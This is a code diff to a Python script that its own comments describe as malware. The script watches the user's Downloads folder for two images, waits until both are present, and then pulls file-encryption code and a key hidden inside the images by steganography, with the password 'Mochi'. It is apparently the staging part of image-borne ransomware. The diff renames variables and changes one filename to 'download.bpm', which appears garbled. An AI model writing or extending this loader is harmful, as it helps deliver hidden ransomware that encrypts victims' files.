@@ -4,8 +4,9 @@ from extract import extract_message
 
 def main():
     # Represents the name of the two images to be scanned for in the downloads directory
+    # TODO: Update this to the name of the appropriate images
     image_containing_key: str = "download.jpg"
-    image_containing_code: str = "download2.jpg"
+    image_containing_encryption_code: str = "download.bpm"
 
     # Represents whether the two images were found or not
     key_found: bool = False
@@ -13,7 +14,7 @@ def main():
 
     # Scans the Downloads folder to look for the images and applications needed
     # for the malware to remain operational
-    whitelist: list[str] = [image_containing_key, image_containing_code]
+    whitelist: list[str] = [image_containing_key, image_containing_encryption_code]
     downloads_directory: str = os.path.expanduser("~/Downloads")
 
     # Iterates through each file within the downloads folder to find the image with the key and malicious code
@@ -22,7 +23,7 @@ def main():
             if file in whitelist:
                 if file == image_containing_key:
                     key_found = True
-                if file == image_containing_code:
+                if file == image_containing_encryption_code:
                     code_found = True
             print(file)
 
@@ -30,7 +31,7 @@ def main():
     ready_to_attack: bool = key_found and code_found
 
     # Retrieves malicious code secretly embedded in one of the images
-    code_to_encrypt_files: str = extract_message(image_containing_code, "Mochi")
+    code_to_encrypt_files: str = extract_message(image_containing_encryption_code, "Mochi")
 
     # Have to keep looking for them at all times until both are found
     while not ready_to_attack:
@@ -47,7 +48,7 @@ def main():
                     if file in whitelist:
                         if file == image_containing_key:
                             key_found = True
-                        if file == image_containing_code:
+                        if file == image_containing_encryption_code:
                             code_found = True
                         ready_to_attack = key_found and code_found
                     print(file)
